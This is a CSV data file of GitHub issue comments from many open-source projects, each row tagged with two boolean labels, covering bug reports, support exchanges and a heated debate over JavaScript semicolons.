npm/npm/21202/404564500,npm/npm/21202,@friend This does not work well with some JS perf optimization patterns. See the monomorphization that improved webpack's speed by ~80% between version 3 and 4. ,False,True
TotalFreedomMod/TotalFreedom/2004/224342781,TotalFreedomMod/TotalFreedom/2004,"Make it overrides real console execute, soo it doesn't run or bypass all command blocks. ",False,True
manageiq/ManageIQ/1210/67523186,manageiq/ManageIQ/1210,"Cool @friend, I'm glad you confirmed what I found.  My concern is that it's not a test bug but a relationship sporadic bug. ",False,True
rpki.net/dragonresearch/198/238309954,rpki.net/dragonresearch/198,i have to wonder if {{{rpki-sql-setup}}} is idempotent.  but i do not want to mess things up by experimenting Trac comment by randy on 2015-08-06T065659Z ,False,True
shlink/shlinkio/210/422334444,shlink/shlinkio/210,"I'm afraid that error means you are not really using PHP 7.2, but 7.0 or older. That's why it does not get ""void"" as a reserved word, and instead it tries to load it as a class. Many people has faced this problem before. Make sure you run the installer with the proper PHP version ",False,True
angular.js/angular/1463/71882447,angular.js/angular/1463,"@friend - thanks a lot. I didn't know where to look for that. we had an incompatible version of angular-resource, without the custom  method. works great after an update. ",False,True
bootstrap/twbs/3057/5147721,bootstrap/twbs/3057,"Guys, more background from 'Fat' on why he doesn't use semicolons written back in October 31st 2011  the use of '&amp;&amp;' instead of an 'if' statement ""If you were really having fun with it you could lose the if all together... Each is perfectly valid. Each behaves the same. It’s just a matter of preference and finding the style that makes most sense to you."" JSLint is described as a ""unnecessarily strict linter"". ""The majority of lines however don’t end with semicolons because they simply aren’t necessary and I prefer the minimalist aesthetic. For me, \n character is enough and the semicolon character is redundant."" ... IMHO Don't be a JavaScript hipster. Add semi-colons. ",False,True
i2cdevlib/jrowberg/252/350639594,i2cdevlib/jrowberg/252,"@friend this issue is not about FIFO overflow. You may want to check if issue is not filed for your problem already (and file a new one if it isn't). Or, if you find this is the relevant issue, please provide more information. E.g., does your MPU6050 latch SDA? Are you using DMP? What platform you're on? Etc. ",False,True
mame/mamedev/4789/479448922,mame/mamedev/4789,"0bd02131b644b61088789f52f31b750c9aecaa6d is an update to bgfx from upstream.  If it started happening after that commit, it's a regression in bgfx itself.  MAME isn't doing anything different.  I also can't reproduce this with MAME 0.208 built with clang 6 and libc++ on Fedora 28.  There must be some other contributing factor. @friend you really need to work on your attitude.  Your comment is abrasive, and your conclusion doesn't match your findings. ",False,True
Skript/SkriptLang/1568/425711966,Skript/SkriptLang/1568,"This is the Skript issue tracker, for tracking issues happening in the supported versions of Minecraft. If you figure something out to make your server work on a supported version and the issue will still occur, please open a separate issue and post a gist.github.com link to the stacktrace along with the Spigot version, Skript version and a list of plugins, addons especially. If you need support with upgrading your server please ask in a more proper place like on the Spigot forums. And about your issue with Skript, I'm 95% sure it's caused by some outdated addon, please try without Umbaska to begin with, and if that doesn't help, ask on skUnity or on Skript Chat. Locking this not to hurt people's eyes more ",False,True
zfs/zfsonlinux/7401/379573246,zfs/zfsonlinux/7401,"Since this seems to be FRAME_POINTER-specific (unless anyone's got a counter-example), I would guess this is #5041 2.0 Elec boogalootric ",False,True
puppeteer-sharp/kblok/736/436360266,puppeteer-sharp/kblok/736,"Nop i was right, its was not my fault, i did everything, in IIS, , but still locks there. At the same point as before ",False,True
scripts/nroberts-trulia/253/18098709,scripts/nroberts-trulia/253,"This repository is publicly accessible. Pushing proprietary code to this repo could reveal trade secrets. If this is intentional, please contact your lead so this repo can be whitelisted. Until that time, please refrain from pushing code to this repo. ",False,True
bootstrap/twbs/3057/5138012,bootstrap/twbs/3057,"I take it you really read ecmascript262 (and I assume you did because you use it as an excuse for the bad practice of omitting semicolons) then you should realize that JS grammar is ambiguous. It's particularly ambiguous where it's about what constitutes a statement if you omit a semicolon. Browsers implement heuristics when trying to parse it (a fancy word for guessing) and as a result don't always agree between each other. Because humans aren't very good at parsing a context-sensitive grammar and executing an approximate state-machine and if/else decision tree to figure out if something is a statement or not, we punny humans tend to do it wrong every once in a while, even if we're extremely well versed and hold the entire JS grammar in our heads (which would be a considerable feat). Fortunately, there's a ""fix"" for this lamentable human condition. The fix is just to insert semicolons, even though technically it's not required in all cases. But I promise you, the time wasted writing out that semicolon is more than compensated by the time you will not spend hunting down heisenbugs due to browsers differing understanding of statements, the time not spent trying to make your JS code compatible to all JS-manglers (like JSmin, closure compiler etc.), the time not spent arguing in favor of an outdated and obviously bad practice with random people on the internet AND the time not spent fixing all your code when a browser implements a newer revision of JS. ",False,True
systemd/systemd/3162/216316459,systemd/systemd/3162,I think internally it's better to whitelist. At least for me it makes easier to look at the list. ,False,True
puppeteer-sharp/kblok/736/437317266,puppeteer-sharp/kblok/736,Wait reproduced the bug or did you successfully executed? I got confused ,False,True
Elgg/Elgg/1547/13655415,Elgg/Elgg/1547,Milestone changed to  by brettp on 40150313-09-02 ,False,True
bud/bloom-lang/232/1428442,bud/bloom-lang/232,"I've only tested , but I added the others because it seemed natural. ",False,True
jekyll/jekyll/6948/384651313,jekyll/jekyll/6948,"@friend It alwyas take some time to update to the latest version for services like GitHub Pages, Forestry, CloudCannon or Siteleaf because they need to run tests and adapt their tools. There's nothing Jekyll's core team can do about it. ",False,True
AKS/Azure/132/414983682,AKS/Azure/132,"As a side note, in production you might be in an infrastructure as code mode, with some ARM templates. If you manually change the size, your template will be desynchronized from the reality. ",False,True
puppeteer-sharp/kblok/736/437013417,puppeteer-sharp/kblok/736,@friend I'll take a look running it on IIS. ,False,True
ludwig/uber/184/470767314,ludwig/uber/184,Use a text feature and set  ;) In the docs text feature ,False,True
cerberus/NEU-Libraries/692/85144770,cerberus/NEU-Libraries/692,Avalon sets their max upload size to 250MB right now. This is set in the master_file model and then checked in the create method in the controller and returns an error if over that size. ,False,True
Elgg/Elgg/2553/13660174,Elgg/Elgg/2553,trac user dannyl wrote on 40836820-10-23 Replying to cash Molto apologies - no attitude intended. Sometimes the fingers are faster than the mind. your time is greatly appreciated of course. What would the appropriate place to post an example on how to interface php code launched from other user agents inside the browser? Wiki ? or trac? D ,False,True
documentation/nextcloud/1142/455349926,documentation/nextcloud/1142,"One last try could it be that the dot-files don't have the correct permissions? Espcially the  file? Is it writable by www-data? Because there were such reports in the forum, which where solved by this. ",False,True
A3-Antistasi/A3Antistasi/57/394319595,A3-Antistasi/A3Antistasi/57,its more or less the same I Will add this and some other options with defaults. Life will be easier. ,False,True
Kosmos/AtlasNX/187/411236297,Kosmos/AtlasNX/187,Probably just offer 2 zips to download. You happy now @friend? shrek ,False,True
termux-packages/termux/2735/412904319,termux-packages/termux/2735,"There may be a some kind of 'race condition' since you running a tar job in background.  - this may be a trigger, i'will try to remove output redirection and see what will happen. ",False,True
Semantic-UI-React/Semantic-Org/2550/379341122,Semantic-UI-React/Semantic-Org/2550,"@friend, and for anyone landing here, I would recommend against what you have proposed for . Those classes are used for lots of other things in the SUI css, not just modals. A safer solution for anyone wanting to use the newest version of SUI styles and this incompatible version of SUIR would be safer doing the following There are other problems you'll encounter using the latest styles, but those above changes should at least fix modals. The last fix for this is coming in PR #2689. ",False,True
cerberus/NEU-Libraries/692/85146469,cerberus/NEU-Libraries/692,"Interesting.  I think we'll want ours larger as we are about to embark (I think) on converting some commercial VHS tapes in the collection. p Patrick Yott Associate Dean for Digital Strategies and Services Northeastern University Libraries 360 Huntington Ave, SL 327 Boston, MA 02117 p.yott@friend.edu 617.373.4194 617.373.5409 (fax) From Eli Zoller notifications@friend.com&lt;mailtonotifications@friend.com&gt; Reply-To NEU-Libraries/cerberus reply@friend.github.com&lt;mailtoreply@friend.github.com&gt; Date Monday, March 23, 2015 at 257 PM To NEU-Libraries/cerberus cerberus@friend.github.com&lt;mailtocerberus@friend.github.com&gt; Cc Patrick Yott p.yott@friend.edu&lt;mailtop.yott@friend.edu&gt; Subject Re [cerberus] 500 Error When Uploading Large(ish) Video (#692) Avalon sets their max upload size to 250MB right now. This is set in the master_file model and then checked in the create method in the controller and returns an error if over that size.  to this email directly or view it on GitHub",False,True
Nutrition/Harvesters/6/51810792,Nutrition/Harvesters/6,The site coordinators editor needs to have the ability to assign a person to multiple program hosts.  Each entry should have unique contact information for each program host. ,False,True
core/owncloud/26374/253937827,core/owncloud/26374,"Making more progress but now completely stuck. I recreated the folder manually and began downloading some of the files from the web interface and placing them on my desktop client folder. Somehow this seemed to unblock the folder and all the files in the folder got deleted on the web too but I am left with the main folder and one subfolder that I cannot delete.  all I get when I try to delete manually from the web interface is Error deleting file ""Images"".  when I try deleting ""images "" from the client nothing happens and the file is still on the web interface  ",False,True
AKS/Azure/287/480075240,AKS/Azure/287,Multiple node pool support is on track for 1H2019 delivery. Reopening to track this as a roadmap top-level item. Please remember this repository is operated under the Microsoft code of conduct ( and comments not adhering to it will be removed. ,False,True
rpki.net/dragonresearch/198/238310013,rpki.net/dragonresearch/198,"OBE, all of this code was rewritten in tk705 Trac comment by sra on 2016-08-05T162059Z ",False,True
METADATA.jl/JuliaLang/7295/267103986,METADATA.jl/JuliaLang/7295,Im very sorry. Will tag when at a computer. ,False,True
zfs/zfsonlinux/7401/379859322,zfs/zfsonlinux/7401,@friend confirmed that this is reproducible using  to create file in the right order (to inflate the zap with hash collisions). I'll post a minimal testcase. ,False,True
officer/davidgohel/141/400760682,officer/davidgohel/141,"Example from documentation This just overwrite doc variable. In src parametr I can pass any string and I get the same result♠doc &lt;- body_add_docx(x = doc, src = ""external_file.docx"" )final_doc &lt;- read_docx()` I can delet and also will get the same result ",False,True
jekyll/jekyll/6948/389797224,jekyll/jekyll/6948,@friend This cannot be implemented because Liquid is parsed and rendered by the  gem. Jekyll only provides the means to use and extend Liquid constructs for use in template files. ,False,True
ARKStatsExtractor/cadon/850/446811326,ARKStatsExtractor/cadon/850,Math doesn't lie. 360  (1 + (0.5  1)) = 540. You creature is clearly higher level than that so you're either wrong or you're missing something. I have checked the numbers you provided and the lowest possible level is 432 with 100% TE. I'm not sure what you expect the author to do for you if you refuse to provide adequate information to help troubleshoot the issue. ,False,True
zfs/zfsonlinux/7401/379858112,zfs/zfsonlinux/7401,The 0.7.7 release has been removed from the CentOS and Fedora RPM repositories. ,False,True
ludwig/uber/184/470698609,ludwig/uber/184,"Please, read the docs, the faqs and the blogpost that describe Ludwig BEFORE asking questions. The short answers are ""yes, it can generate characters"" adn ""not yet, the transformer is coming in the next update"". ",False,True
Osmand/osmandapp/3663/407348784,Osmand/osmandapp/3663,"@friend sounds correct to me, i remember a different place where a fork is within a (slight) curve and the anouncement is played. I think adding an additional condition which checks the road class would fix a lot of those false announcements. But what to do if the road Segments have the same class? ",False,True
ansible/ansible/13262/329233078,ansible/ansible/13262,The only current solution being looping over an  task ,False,True
openbmc/openbmc/1665/487253311,openbmc/openbmc/1665,This issue has been closed because no activity has occurred in the last 7 months. Please reopen if this issue should not have been closed. Thank you for your contributions. ,False,True
npx/zkat/168/385416214,npx/zkat/168,"TotallyInformation I do think the fix is 'test on windows'. And also I think that npx is part of node now, so it is node org that has a blemish. Currently, I can't even find the source code for npx.cmd. What I did is identify the root cause, before my post all the reports on www said they could not ID the cause. ",False,True
np/sindresorhus/185/343045713,np/sindresorhus/185,Is it though? I rather have no feature than one that only works sometimes. What's implemented here is very time sensitive and it's just going to end up with lots of support requests when it doesn't work. Agreed. I want to be able to use 2FA too. A better workaround for now is to just . ,False,True
btrfs/maharmstone/88/441327554,btrfs/maharmstone/88,"@friend It may be one of the problems already fixed, have you tried with the latest master? ",False,True
SevTech-Ages/DarkPacks/2626/392614903,SevTech-Ages/DarkPacks/2626,"Based on this information, this is not an issue anymore. If you can obtain everything and get the item to go back, I don't see what the issue is. Be prepared and bring a second if you are that concerned. ",False,True
xregexp/slevithan/146/173217872,xregexp/slevithan/146,"When using the g flag, the result does appear as an array (as compared to the regular result), but only contains a single element with the first actual match. When forEach is used, all matches are properly detected. ",False,True
rdpwrap/stascorp/601/451101697,rdpwrap/stascorp/601,"I'm really sorry but I can't get this to work and I think I've ended up in a muddle with my dlls. I am trying to get RdpWrap running on Win 10 Home x64, release 10.0.17763.168. I had it running fine before the 1809 update. I thought I had a recollection of having to copy termsrv.dll and rfxvmt.dll into my system32 folder from my system running Win 10 Pro (also .168) so I did this before running uninstall.bat then install.bat. Looking at the instructions and problems it seems that is not required, just to change the .ini file. Anyway, I get various errors - mostly just ""Not listening"", but I'm concerned as to whether I have the correct dlls now. And what happens in syswow64? That seems to be mentioned occasionally by some people  - should rfxvmt.dll be copied there? Which version? So now I'm not sure I have the correct dlls. Could someone send the correct versions I need to work for Win 10 Home x64 10.0.17763.168 with instructions on where they need to be copied to? Then I can follow the instructions above to reinstall and modify the rdpwrap.ini file. Apologies for being an idiot. Thanks. ",False,True
jekyll/jekyll/6948/403271910,jekyll/jekyll/6948,Add the ability to place the post and its files in the same folder. ,False,True
core/owncloud/27775/225272860,core/owncloud/27775,"♠ Thanks for reporting issues back to ownCloud! This is the issue tracker of ownCloud, if you have any support question please check out  is the bug tracker for the Server component. Find other components at  reporting potential security issues please see  make it possible for us to help you please fill out below information carefully. Before reporting any issues please make sure that you're using the latest available version for your major branch (e.g. 9.0.x), see  to reproduce 1. 2. 3. Expected behaviour Tell us what should happen Actual behaviour Tell us what happens instead Server configuration Operating system Web server Database PHP version ownCloud version (see ownCloud admin page) Updated from an older ownCloud or fresh install Where did you install ownCloud from Signing status (ownCloud 9.0 and above) The content of config/config.php List of activated apps Are you using external storage, if yes which one local/smb/sftp/... Are you using encryption yes/no Are you using an external user-backend, if yes which one LDAP/ActiveDirectory/Webdav/... LDAP configuration (delete this part if not used) Client configuration Browser Operating system Logs Web server error log ownCloud log (data/owncloud.log) Browser log ",False,True
spring-security-migrate-issues/rwinch/1169/128574987,spring-security-migrate-issues/rwinch/1169,Taylor Mathewson (Migrated from SEC-1151) said On line 130 of AclImpl.java in trunk (line number is different in other releases) a check is performed on the upper bound of the list of access control entries. Code is         if (aceIndex &gt; this.aces.size()) { should be         if (aceIndex &gt;= this.aces.size()) { Result is that exception out of underlying list impl is thrown.  Minor. ,False,True
rippled/ripple/2241/338154039,rippled/ripple/2241,"Thank you for the help. Our Ripple node is currently using 14.6GB of RAM, is this normal usage? 😮 ",False,True
zfs/zfsonlinux/7401/379601501,zfs/zfsonlinux/7401,"@friend Yes, I've been following this one but haven't looked into it at all.  Has this for sure been narrowed down to cc63068e95ee725cce03b1b7ce50179825a6cda5?  This is clearly something that has to get fixed right away. ",False,True
jekyll/jekyll/6948/406817981,jekyll/jekyll/6948,To benefit from PWA features I'd recommend the use of jekyll-pwaplugin  based on workbox 3 by Google. ,False,True
code-d/Pure-D/29/195632616,code-d/Pure-D/29,i just updated all binaries using workspace-d-installer and updated code-d and vscode and still the same behaviour / ,False,True
jekyll/jekyll/6948/386800657,jekyll/jekyll/6948,(I) really love this ability to minimize comments on GitHub.. sparkles ,False,True
bootstrap/twbs/24475/453826189,bootstrap/twbs/24475,Sorry I didn't see your note until now (though I did check before the 6th). I'm preparing for travel and have to renege on my offer at least for the time being. This is something I could help with in the future so please feel free to reach out if you get stuck jhabdas@friend.com. ,False,True
jekyll/jekyll/6948/404036651,jekyll/jekyll/6948,"What if we made templates pure, or at least atomic? ",False,True
qTox/tux3/425/58759032,qTox/tux3/425,I'm getting this message as well. ,False,True
jekyll/jekyll/6948/406866903,jekyll/jekyll/6948,"@friend The plugin mentioned in the StackOverflow you linked to,  is the best option available out there. However, there is a related proposal for getting similar support in Core #7108 .. ..and another (very distantly) related proposal at #7136 You may subscribe to the above PRs to stay notified about any developments on the proposals ",False,True
body-parser/expressjs/309/386040970,body-parser/expressjs/309,Thanks! Do you think the error message could be changed to be a bit clearer? Or is that infeasible from how  is written? ,False,True
angular-basics/kianaditya/64/429081702,angular-basics/kianaditya/64,"Bumps jasmine-core from 2.99.1 to 3.4.0. &lt;details&gt; &lt;summary&gt;Release notes&lt;/summary&gt;  *Sourced from [jasmine-core's releases]( []( Fix links in 3.4 release notes - []( Bump version to 3.4 - []( No  in the suite - []( Handle WebSocket events in IE when detecting Errors - []( Allow excluded specs in CI without breaking the output - []( Merge branch 'wood1986-fix/npm-audit-dependencies-and-fast-glob-only-failed-t... - []( Consolidate some dev dependencies and use more maintained versions - []( Make node execution default and override for browsers - []( Fix sauce status codes and try travis built-in node support - []( Use the correct env var from travis for tunnels - Additional commits viewable in [compare view]( /&gt;  [![Dependabot compatibility score]( will resolve any conflicts with this PR as long as you don't alter it yourself. You can also trigger a rebase manually by commenting .  [//] # (dependabot-automerge-start) [//] # (dependabot-automerge-end)  ---  &lt;details&gt; &lt;summary&gt;Dependabot commands and options&lt;/summary&gt; &lt;br /&gt;  You can trigger Dependabot actions by commenting on this PR -  will rebase this PR -  will recreate this PR, overwriting any edits that have been made to it -  will merge this PR after your CI passes on it -  will squash and merge this PR after your CI passes on it -  will cancel a previously requested merge and block automerging -  will reopen this PR if it is closed -  will close this PR and stop Dependabot creating any more for this minor/major version (unless you reopen the PR or upgrade to it yourself) -  will close this PR and stop Dependabot creating any more for this dependency (unless you reopen the PR or upgrade to it yourself) -  will set the current labels as the default for future PRs for this repo and language -  will set the current reviewers as the default for future PRs for this repo and language -  will set the current assignees as the default for future PRs for this repo and language -  will set the current milestone as the default for future PRs for this repo and language -  will comment on this PR with code to add a ""Dependabot enabled"" badge to your readme  Additionally, you can set the following in your Dependabot [dashboard]( Update frequency (including time of day and day of week) - Automerge options (never/patch/minor, and dev/runtime dependencies) - Pull request limits (per update run and/or open at any time) - Out-of-range updates (receive only lockfile updates, if desired) - Security updates (receive only security updates, if desired)  Finally, you can contact us by mentioning @friend.  &lt;/details&gt;",False,True
netmiko/ktbyers/1074/464265436,netmiko/ktbyers/1074,You would need to do this in your Python code. Netmiko assumes you are in enable mode when you execute the config_mode() method (so you would have to manually call .enable() if that is not the case). ,False,True
mapserver/mapserver/3147/4940790,mapserver/mapserver/3147,"Author sdlime Date 2009/10/19 - 1927 Jim I did add this to beta 4, but only the mapshape.c change. Please verify that your test base works if you would. Steve ",False,True
bootstrap/twbs/13327/43141135,bootstrap/twbs/13327,Much appreciated @friend! ,False,True
core/owncloud/8282/40969677,core/owncloud/8282,"Steps to reproduce Select multiple files to download, hit download. Expected behaviour It downloads an archive of all selected files. Actual behaviour It downloads an empty archive. Server configuration Operating system Fedora 19 Web server Apache 2.4.7-1.fc19 Database MariaDB (MySQL) 15.5.36-1.fc19 PHP version 5.5.10 ownCloud version 6.0.2-8.2 Updated from an older ownCloud or fresh install Fresh List of activated apps The content of config/config.php 'instanceid' =&gt; 'ocb9b921cd1a',   'passwordsalt' =&gt; '2e948c45dc301325c0ba2d087e0c9b',   'trusteddomains' =&gt;   array (     0 =&gt; '&lt;redacted&gt;',   ),   'datadirectory' =&gt; '/data/owncloud',   'dbtype' =&gt; 'mysql',   'version' =&gt; '6.0.2.2',   'installed' =&gt; true,   'forcessl' =&gt; true,   'maxZipInputSize' =&gt; 5368709120,   'allowZipDownload' =&gt; true,   'dbhost' =&gt; 'localhost',   'dbtableprefix' =&gt; 'oc', Are you using external storage Just a local disk directory Are you using encryption yes Client configuration Browser Google Chrome 34.0.1847.116 m Operating system Windows 7 x86_64 Logs Web Server Error Log [Mon Apr 21 113859.432555 2014] [sslerror] [pid 2163] [client &lt;redacted&gt;36327] AH02042 rejecting client initiated renegotiation [Mon Apr 21 193913.078443 2014] [access_compaterror] [pid 2165] [client &lt;redacted&gt;32950] AH01797 client denied by server configuration /var/www/html/owncloud/data/htaccesstest.txt [Mon Apr 21 194628.892562 2014] [access_compaterror] [pid 969] [client &lt;redacted&gt;32965] AH01797 client denied by server configuration /var/www/html/owncloud/data/htaccesstest.txt Web Server Log &lt;redacted&gt; - - [21/Apr/2014192806 +0000] ""GET /index.php/apps/files/ajax/download.php?dir=%2FTorrents&amp;files=%5B%22(%E5%90%8C%E4%BA%BACG%E9%9B%86)+%5B%5D(%E3%82%AD%E3%83%AB%E3%83%A9%E3%82%AD%E3%83%AB).zip%22%2C%22.zip%22%2C%22Kill+La+Kill.zip%22%2C%22aaaa.zip%22%2C%22%5BAAAA%5D+%E5%85%A8%E8%87%AA%E5%8B%95%E3%82%AD%E3%83%AB%E3%83%9E%E3%82%B7%E3%83%BC%E3%83%B3+(%E3%82%AD%E3%83%AB%E3%83%A9%E3%82%AD%E3%83%AB).zip%22%5D HTTP/1.1"" 200 - ",False,True
KnpMenu/KnpLabs/213/129409308,KnpMenu/KnpLabs/213,"@friend Done. Cached for , as spotted in Doctrine. Is there any relevant difference? ",False,True
zfs/zfsonlinux/7401/379821060,zfs/zfsonlinux/7401,"@friend @friend is the maintainer for RHEL-based systems and he just got into the office. He likely does not even know about this yet. I'll give him a call to let him know so that he can take the update out of the RPM repository. Thanks for pointing it out. @friend pointed out to me in IRC that it could be that this is mainly reproducible only on RHEL-based systems because they use xattr=sa to speed up SELinux's handling of filesystem labels. The xattr=sa could be related or not. I had a late start on this today, so I am not certain either way at this point, but I think that he made a good point that the interaction with  should be considered. ",False,True
mapserver/mapserver/3147/4940791,mapserver/mapserver/3147,Author jimk Date 2009/10/19 - 1950 Thanks. It looks like it was committed in 84a97cab1ed2a0a11e7a1e1d36f6813737a2878f (r9480). I tested against bc6ca1fddc89c27b7cf30939b6ce11d54b6f909f (r9494) and it is working. ,False,True
Kosmos/AtlasNX/187/465093769,Kosmos/AtlasNX/187,@friend I would absolutely agree if it was anything other than these patches. ,False,True
zfs/zfsonlinux/8259/453279143,zfs/zfsonlinux/8259, love the replies. Greg K-H ,False,True
np/sindresorhus/185/334312557,np/sindresorhus/185,I forgot to add that the biggest drawback of doing it this way is that a one-time password could be invalid by the time a long running  command that does testing and installing of node_modules got to the publish step. ,False,True
Osmand/osmandapp/3663/221975343,Osmand/osmandapp/3663,"There are a couple of areas where I think it would be nice to have some polish on the driving instructions issued, and when. As a navigator I was always taught 'don't issue an instruction unless it's to change road', and as a driver I completely understand that.  Especially on a motorway, being told every mile or two 'keep right' gets very old very quickly.  I'd rather be told the distance to the point at which I would leave the road I am currently on, and instructions issued for that point only. Also, it seems arbitrary when the 'keep right/left' instruction is actually called - not sure if that's an OSMand issue or something to with the nodes in the OSM data itself. Any chance we can have this as an option? Also, the instruction 'turn slightly right' can be very ambiguous at junctions.  In line with what I mentioned above, I think for clarity having the option to just say 'turn left' or 'turn right' to indicate leaving the current road and moving on to a new road, irrespective of the severity of the turn, would reduce any confusion.  That way the driving instructions aren't overly verbose - they are clear and concise.  Of course I understand that other people might be used to having such verbosity from other driving aids, which is why I'm suggesting making them optional. ",False,True
bootstrap/twbs/3057/5159698,bootstrap/twbs/3057,"@friend Actually I was just trolling. The Crockford video was quoted from the guy above. But could you be any more smug? Does it make you feel smart to tell people they're ""doing it wrong""? Your epenis must be enormous. @friend Yeah you're right. javaScrHiptsters use lower camel case. ",False,True
GameController/RoboCup-Humanoid-TC/17/223780657,GameController/RoboCup-Humanoid-TC/17,Adding the Rhoban Football Club logo (HL KID team 16) ,False,True
puppeteer-sharp/kblok/736/435945079,puppeteer-sharp/kblok/736,"of course not. but  do, but not on ISS, trust me, i did it on windows forms but i cant do it on IIS xD ",False,True
i2cdevlib/jrowberg/252/229102224,i2cdevlib/jrowberg/252,"@friend I never wanted to offend you. I know you did this library for free and you are contributing a lot with the community providing it to general use. This library is really great but there are some bugs with it. When you have sometime I would like you to take a look at this  some reason your library is a little ""unstable"", when you change some lines of code it simply stops working. I also provide you below with a really simple code to use your great library to retrive DMP data from MPU6050 without using interrupt pin. It simply freezes arduino after some time. I already checked with an osciloscope and everything is working fine there is not reason (at the hardware) that could make this freeze happens. Could you please run the code below in your arduino and wait a few seconds? After around 10-30 seconds your arduino will freeze. ",False,True
Semantic-UI-React/Semantic-Org/2550/376652870,Semantic-UI-React/Semantic-Org/2550,I haven't received a reply yet on my question here for @friend so I think for now I am just going to proceed without some sort of legacy/fallback prop. I'll try to keep a close eye on whatever happens with modals in the next version of SUI since it sounds like there are going to be some additional breaking changes incoming. Starting a branch on this now in the office as I've blocked out some official work hours to get this working. PR should be up this afternoon. ,False,True
ansible/ansible/13262/322484115,ansible/ansible/13262,"I would like to point out to the Ansible core developers that this issue has more people requesting it than any other issue in this repo, so perhaps its priority should be raised. Currently it has 276 votes (in the form of a thumbs up reaction on the top comment). The next most popular issue has only 53. @friend tagging you for visibility. ",False,True
SickChill/SickChill/5159/437650557,SickChill/SickChill/5159,"It isnt going to make any changes to local access, and 2FA is just an optional feature that I plan to add support for, not a requirement. Web auth from remote machines? Yes, I'm going to block those if there is no password set or at least a hidden setting set. The people who REALLY WANT to run an insecure server will be able to do it, but it will be easier to be safe than to be unsafe from now on. You guys should read the thread before posting lol, nobody has ever said 2FA was going to be required, and it's going to pop up warnings for http connections and no web auth when connecting remotely unless they are dismissed/explicitly disabled.  You guys really dont take your freedom seriously? ",False,True
puppeteer-sharp/kblok/736/442231923,puppeteer-sharp/kblok/736,"I tried the v1.10, with --no-sandbox works, without it looks like the deadlock is still there. Don't know if this log can help, but that's what I got ♠trce PuppeteerSharp.Connection[0]       Send  1 Method Target.setDiscoverTargets Params { discover = True } trce PuppeteerSharp.Connection[0]       ? Receive {""method""""Target.targetCreated"",""params""{""targetInfo""{""targetId""""3276034a-b7f0-462b-af30-c26a3fe05f40"",""type""""browser"",""title"""""",""url"""""",""attached""false}}} trce PuppeteerSharp.Connection[0]       ? Receive {""method""""Target.targetCreated"",""params""{""targetInfo""{""targetId""""5EACC14CD88992030B76F44B4729FDDD"",""type""""page"",""title"""""",""url""""aboutblank"",""attached""false,""browserContextId""""6E425A78148B53E4686790E8F708EADA""}}} trce PuppeteerSharp.Connection[0]       ? Receive {""method""""Target.targetCreated"",""params""{""targetInfo""{""targetId""""b97ca89b-6136-4bad-8de2-8aa0722e3820"",""type""""browser"",""title"""""",""url"""""",""attached""true}}} trce PuppeteerSharp.Connection[0]       ? Receive {""id""1,""result""{}} trce PuppeteerSharp.Connection[0]       Send  2 Method Target.createTarget Params [url, aboutblank] trce PuppeteerSharp.Connection[0]       ? Receive {""method""""Target.targetCreated"",""params""{""targetInfo""{""targetId""""F5E5D9799EEDBC8CE189DE8BE015AD9A"",""type""""page"",""title"""""",""url"""""",""attached""false,""browserContextId""""6E425A78148B53E4686790E8F708EADA""}}} trce PuppeteerSharp.Connection[0]       ? Receive {""id""2,""result""{""targetId""""F5E5D9799EEDBC8CE189DE8BE015AD9A""}} trce PuppeteerSharp.Connection[0]       ? Receive {""method""""Target.targetInfoChanged"",""params""{""targetInfo""{""targetId""""F5E5D9799EEDBC8CE189DE8BE015AD9A"",""type""""page"",""title"""""",""url""""aboutblank"",""attached""false,""browserContextId""""6E425A78148B53E4686790E8F708EADA""}}} trce PuppeteerSharp.Connection[0]       Send  3 Method Target.attachToTarget Params { targetId = F5E5D9799EEDBC8CE189DE8BE015AD9A } trce PuppeteerSharp.Connection[0]       ? Receive {""method""""Target.targetCrashed"",""params""{""targetId""""F5E5D9799EEDBC8CE189DE8BE015AD9A"",""status""""failed to launch"",""errorCode""18}} trce PuppeteerSharp.Connection[0]       ? Receive {""method""""Target.targetInfoChanged"",""params""{""targetInfo""{""targetId""""F5E5D9799EEDBC8CE189DE8BE015AD9A"",""type""""page"",""title"""""",""url""""aboutblank"",""attached""true,""browserContextId""""6E425A78148B53E4686790E8F708EADA""}}} trce PuppeteerSharp.Connection[0]       ? Receive {""method""""Target.attachedToTarget"",""params""{""sessionId""""87634875ECAD81B62CDC1B6CDACEA827"",""targetInfo""{""targetId""""F5E5D9799EEDBC8CE189DE8BE015AD9A"",""type""""page"",""title"""""",""url""""aboutblank"",""attached""true,""browserContextId""""6E425A78148B53E4686790E8F708EADA""},""waitingForDebugger""false}} trce PuppeteerSharp.Connection[0]       ? Receive {""id""3,""result""{""sessionId""""87634875ECAD81B62CDC1B6CDACEA827""}} trce PuppeteerSharp.CDPSession[0]       Send  1 Method Page.enable Params (null) trce PuppeteerSharp.Connection[0]       Send  4 Method Target.sendMessageToTarget Params [sessionId, 87634875ECAD81B62CDC1B6CDACEA827], [message, {""id""1,""method""""Page.enable"",""params""null}] trce PuppeteerSharp.Connection[0]       ? Receive {""id""4,""result""{}}` ",False,True
expo/expo/3030/451576054,expo/expo/3030,"Hi. Sorry to write here but there is a critical bug for those who use the ""expo-print"" module on iOS. I did the post a few days ago. I hope you can review it when you have time and see if with this release you can fix it 3 ",False,True
bootstrap/twbs/3057/5139814,bootstrap/twbs/3057,"It also works with  I believe and  is actually smaller then jsmin. Both are positives! Or you could just not minify your javascript, in this day and age with the amount of bandwidth we all have. It really would not be a big deal. ",False,True
forum/standardnotes/39/434671063,forum/standardnotes/39,Another vote for keyboard shortcuts. An app focused on taking notes and working with text can't not have enough of these. ,False,True
A3-Antistasi/A3Antistasi/57/394339711,A3-Antistasi/A3Antistasi/57,"I proposed a similar solution in a forum thread so for each of theese options we could make a parameter in the parameters menu. Each parameter will have three options Force ON, Force OFF, Default. The 3rd one (Default) will cause default behaviour with GUI appearing at mission start. Others will force the corresponding options to one of the two states. So We have total compatibility with people already running the mission and we add possibility for other admins to set it to whatever they want. ",False,True
bootstrap/twbs/3057/5138993,bootstrap/twbs/3057,"tl;dr Someone finds bug in JSMin, people that use Bootstrap (for free) make demands and lecture the authors about the one true way to write JavaScript. ",False,True
bootstrap/twbs/9501/33286797,bootstrap/twbs/9501,  ,False,True
dataverse/IQSS/1513/215571385,dataverse/IQSS/1513,Waiting for #1380 to be fixed before we can test. ,False,True
viewer-sinatra/everypolitician/2550/170215233,viewer-sinatra/everypolitician/2550,I've updated DATASOURCE on master ,False,True
core/owncloud/26374/253929862,core/owncloud/26374,xxxxx@friend/var/www/owncloud$ sudo -u www-data php owncloud/updater/application.php Could not open input file owncloud/updater/application.php ,False,True
